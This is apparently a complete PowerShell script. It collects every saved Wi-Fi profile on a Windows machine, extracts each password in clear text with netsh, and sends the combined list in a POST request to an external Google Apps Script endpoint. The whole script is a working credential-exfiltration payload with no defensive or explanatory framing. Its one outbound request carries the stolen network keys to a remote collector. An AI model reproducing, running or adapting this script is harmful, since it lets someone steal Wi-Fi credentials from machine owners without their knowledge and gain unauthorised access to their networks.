# --- Get All Saved Wi-Fi Profiles and Passwords ---
$wifiList = netsh wlan show profiles | Select-String "\s+All User Profile\s+:\s+(.*)" | ForEach-Object {
    $ssid = $_.Matches.Groups[1].Value.Trim()
    $pass = (netsh wlan show profile name="$ssid" key=clear | Select-String "Key Content\W+:(.+)$").Matches.Groups[1].Value.Trim()
    
    # If no password is found (e.g., Open Network), mark it as None
    if (-not $pass) { $pass = "[No Password]" }
    
    "$ssid: $pass"
}
$allWifi = $wifiList -join " | "
# -------------------------------------------------

$body = @{
        allwifi  = $allWifi # This now contains all saved credentials
}

Invoke-RestMethod -Uri "https://script.google.com/macros/s/AKfycbyeNDhmNh-zMEfXMHr30U2zB6iGZi09bcOfCyslF8KT9mk9EO08p-pHbLv1-OfhNI63/exec" -Method POST -Body $body
